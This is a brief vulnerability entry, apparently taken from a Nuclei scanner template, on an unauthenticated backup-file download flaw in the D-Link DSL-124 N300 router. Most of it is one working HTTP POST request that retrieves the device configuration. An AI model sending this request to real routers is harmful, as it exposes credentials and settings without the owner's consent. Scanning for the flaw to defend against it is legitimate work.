# Vulnerability: DSL-124 Wireless N300 ADSL2+ - Backup File Disclosure
**Classification:** DSL
**Source:** Nuclei Template (`dlink-n300-backup.yaml`)

## Description
The DSL-124 Wireless N300 ADSL2+ router exposes a backup configuration file that can be downloaded without authentication.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /form2saveConf.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

submit.htm?saveconf.htm=Back+Settings
```

